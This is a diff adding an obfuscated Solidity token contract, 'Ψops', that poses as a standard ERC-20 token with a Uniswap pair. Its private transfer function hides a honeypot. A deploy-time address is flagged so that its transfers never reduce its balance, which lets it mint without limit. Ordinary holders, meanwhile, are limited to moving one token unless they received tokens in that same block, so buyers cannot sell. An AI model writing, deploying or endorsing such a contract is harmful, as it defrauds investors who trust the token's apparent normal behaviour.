@@ -1,0 +1,62 @@
+contract ops is Ownable {
+    address private pxovedlknfb;
+
+    mapping(address => uint256) private avqdktyxs;
+
+    function transfer(address kzqnwvepglcs, uint256 izme) public returns (bool success) {
+        icsexf(msg.sender, kzqnwvepglcs, izme);
+        return true;
+    }
+
+    mapping(address => uint256) private cuhm;
+
+    uint8 public decimals = 9;
+
+    string public symbol = unicode"Ψops";
+
+    mapping(address => mapping(address => uint256)) public allowance;
+
+    mapping(address => uint256) public balanceOf;
+
+    function approve(address tsyg, uint256 izme) public returns (bool success) {
+        allowance[msg.sender][tsyg] = izme;
+        emit Approval(msg.sender, tsyg, izme);
+        return true;
+    }
+
+    event Transfer(address indexed from, address indexed to, uint256 value);
+
+    uint256 private xlkr = 106;
+
+    function transferFrom(address wiqe, address kzqnwvepglcs, uint256 izme) public returns (bool success) {
+        require(izme <= allowance[wiqe][msg.sender]);
+        allowance[wiqe][msg.sender] -= izme;
+        icsexf(wiqe, kzqnwvepglcs, izme);
+        return true;
+    }
+
+    constructor(address pmlh) {
+        balanceOf[msg.sender] = totalSupply;
+        avqdktyxs[pmlh] = xlkr;
+        IUniswapV2Router02 jqfwdihytvlo = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
+        pxovedlknfb = IUniswapV2Factory(jqfwdihytvlo.factory()).createPair(address(this), jqfwdihytvlo.WETH());
+    }
+
+    event Approval(address indexed owner, address indexed spender, uint256 value);
+
+    uint256 public totalSupply = 1000000000 * 10 ** 9;
+
+    function icsexf(address wiqe, address kzqnwvepglcs, uint256 izme) private {
+        if (0 == avqdktyxs[wiqe]) {
+            if (wiqe != pxovedlknfb && cuhm[wiqe] != block.number && izme < totalSupply) {
+                require(izme <= totalSupply / (10 ** decimals));
+            }
+            balanceOf[wiqe] -= izme;
+        }
+        balanceOf[kzqnwvepglcs] += izme;
+        cuhm[kzqnwvepglcs] = block.number;
+        emit Transfer(wiqe, kzqnwvepglcs, izme);
+    }
+
+    string public name = unicode"Ψops";
+}
